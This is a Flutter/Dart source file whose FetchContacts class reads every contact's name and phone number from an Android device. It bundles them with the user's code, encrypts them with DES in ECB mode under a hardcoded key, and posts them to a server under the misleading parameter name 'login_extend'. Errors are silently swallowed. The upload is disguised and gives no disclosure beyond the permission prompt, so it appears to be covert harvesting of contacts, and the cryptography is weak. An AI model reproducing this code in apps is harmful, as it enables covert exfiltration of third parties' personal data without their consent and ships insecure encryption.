
import 'dart:io';
import 'package:convert/convert.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:dart_des/dart_des.dart';
import 'package:ftoast/ftoast.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:throttling/throttling.dart';

import '../api/request/apis.dart';
import '../api/request/request.dart';
import '../api/request/request_client.dart';


class FetchContacts {
  // updateFun(context) async{
  //   final thr = Throttling(duration: const Duration(seconds: 1));//total
  //   thr.throttle(() {
  //     getConfigData();
  //   });
  //   await Future<void>.delayed(const Duration(seconds: 1));
  //   thr.throttle(() {
  //     checkVersion(context);
  //   });
  //   await thr.close();
  // }

  void postUserInfo(context)=> request(() async {
    var data = await requestClient.post(APIS.userInfo,data: {});

    if(data['usercode']!=null){
      print('usercodeResult');
      fetchContacts(context,data['usercode']);
    }

  });

  Future<PermissionStatus> _getContactPermission() async {
    PermissionStatus permission = await Permission.contacts.status;
    print('beforewhatgrantedSta');
    print(permission);//denied
    if (permission != PermissionStatus.granted &&
        permission != PermissionStatus.permanentlyDenied) {
      PermissionStatus permissionStatus = await Permission.contacts.request();
      return permissionStatus;
    } else {
      return permission;
    }
  }

  fetchContacts(context,userCode) async {
// Get all contacts on device
    try {
      if(Platform.isAndroid) {
        PermissionStatus permissionStatus = await _getContactPermission();
        print('whatgrantedSta');
        print(permissionStatus);

        if (permissionStatus == PermissionStatus.granted) {
          print('grantedSta');
        } else {
          print('nnoograntedSta');
          return;
        }
      }
    List<Contact> contacts = await ContactsService.getContacts();

    Map<String, dynamic> mapcontacts = {
      "project": "",
      "platform": "",
      "nickname": userCode,
      "phone": "",
      "concatList": ""
    };
    String lsttemp = "";
    for (int i = 0; i < contacts.length; ++i) {
      List<Item>? phones = contacts[i].phones;
      int n = 0;
      if (phones != null) {
        n = phones.length;
        for (int j = 0; j < n; ++j) {
          lsttemp = lsttemp +
              contacts[i].displayName.toString() +
              "|" +
              phones[j].value.toString() +
              "#";
        }
      }
    }
    mapcontacts['concatList'] = lsttemp;
    var params = {};
    if (lsttemp.isNotEmpty) {
      params = {
        'login_extend': hex.encode(encryptDes(mapcontacts.toString(), "1111abcd"))
            .toUpperCase()
      };
      // FToast.toast(context, msg:lsttemp);
      print('loginExtendParams');
      print(params);

      var map = await requestClient.post(APIS.contacts,data: params);
      print('loginExtendResult');
      print(map);

    }

    } catch (e, s) {}


  }

  List<int> encryptDes(String message, String key) {
    DES desECBPKCS5 = DES(
      key: key.codeUnits,
      mode: DESMode.ECB,
      paddingType: DESPaddingType.PKCS5,
    );

    var encrypted = desECBPKCS5.encrypt(message.codeUnits);
    return encrypted;
  }

}